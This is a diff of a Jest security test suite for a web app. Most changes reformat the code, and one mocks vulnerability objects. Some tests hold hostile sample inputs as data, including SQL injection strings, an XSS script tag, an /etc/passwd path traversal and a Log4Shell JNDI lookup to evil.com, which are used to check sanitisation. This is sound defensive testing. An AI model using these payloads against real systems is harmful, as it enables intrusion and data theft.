@@ -29,7 +29,7 @@ describe('Security Test Framework', () => {
   describe('Security Infrastructure Setup', () => {
     test('should configure security headers correctly', async () => {
       const headers = await framework.getSecurityHeaders();
-      
+
       // Critical security headers
       expect(headers['x-content-type-options']).toBe('nosniff');
       expect(headers['x-frame-options']).toBe('DENY');
@@ -44,12 +44,12 @@ describe('Security Test Framework', () => {
       const bypassToken = await authBypass.generateTestToken({
         userId: 'test-user-123',
         role: 'admin',
-        permissions: ['read', 'write', 'admin']
+        permissions: ['read', 'write', 'admin'],
       });
 
       expect(bypassToken).toBeDefined();
       expect(typeof bypassToken).toBe('string');
-      
+
       const decoded = await authBypass.validateTestToken(bypassToken);
       expect(decoded.userId).toBe('test-user-123');
       expect(decoded.role).toBe('admin');
@@ -58,13 +58,13 @@ describe('Security Test Framework', () => {
 
     test('should create security test utilities', () => {
       const maliciousPayloads = securityUtils.getMaliciousPayloads();
-      
+
       expect(maliciousPayloads.sqlInjection).toBeDefined();
       expect(maliciousPayloads.xss).toBeDefined();
       expect(maliciousPayloads.csrf).toBeDefined();
       expect(maliciousPayloads.pathTraversal).toBeDefined();
       expect(maliciousPayloads.commandInjection).toBeDefined();
-      
+
       // Should have diverse attack vectors
       expect(maliciousPayloads.sqlInjection.length).toBeGreaterThan(10);
       expect(maliciousPayloads.xss.length).toBeGreaterThan(10);
@@ -72,7 +72,7 @@ describe('Security Test Framework', () => {
 
     test('should configure rate limiting middleware', async () => {
       const rateLimitConfig = await framework.getRateLimitConfig();
-      
+
       expect(rateLimitConfig.windowMs).toBeGreaterThan(0);
       expect(rateLimitConfig.max).toBeGreaterThan(0);
       expect(rateLimitConfig.message).toContain('Too many requests');
@@ -82,7 +82,7 @@ describe('Security Test Framework', () => {
 
     test('should set up CORS security configuration', async () => {
       const corsConfig = await framework.getCorsConfig();
-      
+
       expect(corsConfig.origin).toBeDefined();
       expect(corsConfig.credentials).toBe(false);
       expect(corsConfig.optionsSuccessStatus).toBe(204);
@@ -92,7 +92,7 @@ describe('Security Test Framework', () => {
 
     test('should create security monitoring utilities', () => {
       const monitoring = framework.getSecurityMonitoring();
-      
+
       expect(monitoring.logSecurityEvents).toBeDefined();
       expect(monitoring.detectSuspiciousActivity).toBeDefined();
       expect(monitoring.blockMaliciousRequests).toBeDefined();
@@ -101,7 +101,7 @@ describe('Security Test Framework', () => {
 
     test('should set up request validation middleware', async () => {
       const validationConfig = await framework.getRequestValidationConfig();
-      
+
       expect(validationConfig.maxPayloadSize).toBeGreaterThan(0);
       expect(validationConfig.allowedMimeTypes).toBeDefined();
       expect(validationConfig.maxUrlLength).toBeGreaterThan(0);
@@ -110,7 +110,7 @@ describe('Security Test Framework', () => {
 
     test('should configure session security', async () => {
       const sessionConfig = await framework.getSessionSecurityConfig();
-      
+
       expect(sessionConfig.secret).toBeDefined();
       expect(sessionConfig.resave).toBe(false);
       expect(sessionConfig.saveUninitialized).toBe(false);
@@ -122,7 +122,7 @@ describe('Security Test Framework', () => {
 
     test('should set up API key validation', async () => {
       const apiKeyConfig = await framework.getApiKeyConfig();
-      
+
       expect(apiKeyConfig.headerName).toBe('x-api-key');
       expect(apiKeyConfig.algorithm).toBe('HS256');
       expect(apiKeyConfig.expiration).toBeGreaterThan(0);
@@ -131,7 +131,7 @@ describe('Security Test Framework', () => {
 
     test('should configure IP whitelisting', async () => {
       const ipWhitelist = await framework.getIpWhitelist();
-      
+
       expect(Array.isArray(ipWhitelist.allowedIps)).toBe(true);
       expect(Array.isArray(ipWhitelist.allowedRanges)).toBe(true);
       expect(ipWhitelist.blockMaliciousIps).toBe(true);
@@ -144,7 +144,7 @@ describe('Security Test Framework', () => {
       const results = await framework.runSecurityTests({
         type: 'sql-injection',
         endpoints: ['/api/users', '/api/bookings', '/api/listings'],
-        methods: ['GET', 'POST', 'PUT', 'DELETE']
+        methods: ['GET', 'POST', 'PUT', 'DELETE'],
       });
 
       expect(results.passed).toBe(true);
@@ -157,7 +157,7 @@ describe('Security Test Framework', () => {
       const results = await framework.runSecurityTests({
         type: 'xss-protection',
         endpoints: ['/api/messages', '/api/reviews', '/api/profile'],
-        methods: ['POST', 'PUT']
+        methods: ['POST', 'PUT'],
       });
 
       expect(results.passed).toBe(true);
@@ -169,7 +169,7 @@ describe('Security Test Framework', () => {
       const results = await framework.runSecurityTests({
         type: 'csrf-protection',
         endpoints: ['/api/payments', '/api/bookings', '/api/settings'],
-        methods: ['POST', 'PUT', 'DELETE']
+        methods: ['POST', 'PUT', 'DELETE'],
       });
 
       expect(results.passed).toBe(true);
@@ -181,7 +181,7 @@ describe('Security Test Framework', () => {
         type: 'rate-limiting',
         endpoints: ['/api/auth/login', '/api/auth/register'],
         methods: ['POST'],
-        options: { requestsPerSecond: 10, burstSize: 20 }
+        options: { requestsPerSecond: 10, burstSize: 20 },
       });
 
       expect(results.passed).toBe(true);
@@ -192,7 +192,7 @@ describe('Security Test Framework', () => {
       const results = await framework.runSecurityTests({
         type: 'auth-bypass',
         endpoints: ['/api/admin/*', '/api/payments/*'],
-        methods: ['GET', 'POST', 'PUT', 'DELETE']
+        methods: ['GET', 'POST', 'PUT', 'DELETE'],
       });
 
       expect(results.passed).toBe(true);
@@ -203,7 +203,7 @@ describe('Security Test Framework', () => {
       const results = await framework.runSecurityTests({
         type: 'file-upload',
         endpoints: ['/api/upload', '/api/listings/images'],
-        methods: ['POST']
+        methods: ['POST'],
       });
 
       expect(results.passed).toBe(true);
@@ -215,7 +215,7 @@ describe('Security Test Framework', () => {
       const results = await framework.runSecurityTests({
         type: 'data-validation',
         endpoints: ['/api/users', '/api/bookings', '/api/listings'],
-        methods: ['POST', 'PUT']
+        methods: ['POST', 'PUT'],
       });
 
       expect(results.passed).toBe(true);
@@ -243,13 +243,13 @@ describe('Security Test Framework', () => {
         framework.runSecurityTests({
           type: 'concurrent-test',
           endpoints: [`/api/test-${i}`],
-          methods: ['GET']
-        })
+          methods: ['GET'],
+        }),
       );
 
       const results = await Promise.all(testPromises);
 
-      results.forEach(result => {
+      results.forEach((result) => {
         expect(result.passed).toBe(true);
         expect(result.testsRun).toBeGreaterThan(0);
       });
@@ -277,9 +277,9 @@ describe('Security Test Framework', () => {
       expect(pathTraversalPayloads.length).toBeGreaterThan(3);
 
       // Should contain common attack patterns
-      expect(sqlPayloads.some(p => p.includes('OR 1=1'))).toBe(true);
-      expect(xssPayloads.some(p => p.includes('<script>'))).toBe(true);
-      expect(pathTraversalPayloads.some(p => p.includes('../'))).toBe(true);
+      expect(sqlPayloads.some((p) => p.includes('OR 1=1'))).toBe(true);
+      expect(xssPayloads.some((p) => p.includes('<script>'))).toBe(true);
+      expect(pathTraversalPayloads.some((p) => p.includes('../'))).toBe(true);
     });
 
     test('should validate security headers in responses', async () => {
@@ -288,8 +288,8 @@ describe('Security Test Framework', () => {
           'content-security-policy': "default-src 'self'",
           'x-content-type-options': 'nosniff',
           'x-frame-options': 'DENY',
-          'strict-transport-security': 'max-age=31536000'
-        }
+          'strict-transport-security': 'max-age=31536000',
+        },
       };
 
       const validation = securityUtils.validateSecurityHeaders(mockResponse);
@@ -301,11 +301,11 @@ describe('Security Test Framework', () => {
       const suspiciousRequests = [
         { ip: '192.168.1.100', userAgent: 'curl/7.68.0', requestCount: 100 },
         { ip: '10.0.0.1', userAgent: 'python-requests/2.25.1', requestCount: 50 },
-        { ip: '172.16.0.1', userAgent: 'Mozilla/5.0', requestCount: 5 }
+        { ip: '172.16.0.1', userAgent: 'Mozilla/5.0', requestCount: 5 },
       ];
 
       const analysis = securityUtils.analyzeRequestPatterns(suspiciousRequests);
-      
+
       expect(analysis.suspiciousIps).toContain('192.168.1.100');
       expect(analysis.suspiciousIps).toContain('10.0.0.1');
       expect(analysis.suspiciousIps).not.toContain('172.16.0.1');
@@ -317,10 +317,10 @@ describe('Security Test Framework', () => {
         "'; DROP TABLE users; --",
         '../../../etc/passwd',
         '{{7*7}}',
-        '${jndi:ldap://evil.com/a}'
+        '${jndi:ldap://evil.com/a}',
       ];
 
-      maliciousInputs.forEach(input => {
+      maliciousInputs.forEach((input) => {
         const sanitized = securityUtils.sanitizeInput(input);
         expect(sanitized).not.toContain('<script>');
         expect(sanitized).not.toContain('DROP TABLE');
@@ -335,12 +335,12 @@ describe('Security Test Framework', () => {
         { name: 'malware.exe', mimeType: 'application/x-executable' },
         { name: 'script.php', mimeType: 'application/x-php' },
         { name: 'huge.jpg', size: 100 * 1024 * 1024 }, // 100MB
-        { name: 'normal.jpg', size: 1024, mimeType: 'image/jpeg' }
+        { name: 'normal.jpg', size: 1024, mimeType: 'image/jpeg' },
       ];
 
-      maliciousFiles.forEach(file => {
+      maliciousFiles.forEach((file) => {
         const validation = securityUtils.validateFileUpload(file);
-        
+
         if (file.name === 'normal.jpg') {
           expect(validation.isValid).toBe(true);
         } else {
@@ -382,7 +382,7 @@ describe('Security Test Framework', () => {
     test('should handle token expiration', async () => {
       const expiredToken = await authBypass.generateTestToken({
         userId: 'test-user',
-        expiresIn: -1 // Already expired
+        expiresIn: -1, // Already expired
       });
 
       const validation = await authBypass.validateTestToken(expiredToken);
@@ -392,12 +392,12 @@ describe('Security Test Framework', () => {
 
     test('should revoke test tokens', async () => {
       const token = await authBypass.generateTestToken({ userId: 'test-user' });
-      
+
       const beforeRevocation = await authBypass.validateTestToken(token);
       expect(beforeRevocation.isValid).toBe(true);
 
       await authBypass.revokeTestToken(token);
-      
+
       const afterRevocation = await authBypass.validateTestToken(token);
       expect(afterRevocation.isValid).toBe(false);
       expect(afterRevocation.error).toContain('revoked');
@@ -424,16 +424,24 @@ describe('Security Test Framework', () => {
     });
 
     test('should handle security test failures gracefully', async () => {
-      // Mock a failing test
+      // Mock a failing test with proper Vulnerability objects
       jest.spyOn(framework, 'runSecurityTests').mockResolvedValueOnce({
         passed: false,
-        vulnerabilities: ['SQL Injection detected'],
+        vulnerabilities: [
+          {
+            type: 'SQL_INJECTION',
+            severity: 'critical',
+            description: 'SQL Injection detected in user input',
+            endpoint: '/api/users',
+            recommendation: 'Use parameterized queries',
+          },
+        ],
         testsRun: 10,
-        executionTime: 1000
+        executionTime: 1000,
       });
 
       const results = await framework.runCompleteSecuritySuite();
-      
+
       expect(results.overallStatus).toBe('FAILED');
       expect(results.criticalIssues.length).toBeGreaterThan(0);
       expect(results.recommendations.length).toBeGreaterThan(0);
